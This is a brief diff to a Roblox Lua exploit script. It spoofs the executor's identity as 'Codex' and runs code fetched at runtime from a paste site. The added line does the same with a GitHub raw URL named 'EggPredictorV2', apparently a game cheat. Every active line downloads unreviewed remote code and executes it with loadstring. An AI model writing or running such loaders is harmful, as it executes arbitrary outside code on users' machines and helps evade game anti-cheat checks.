@@ -1,3 +1,4 @@
 identifyexecutor = function() return "Codex" end
 getgenv().identifyexecutor = function() return "Codex" end 
 loadstring(game:HttpGet("https://cdn.sourceb.in/bins/mUnfKZXe35/0", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/garou01472/LunixHub/refs/heads/main/EggPredictorV2"))()
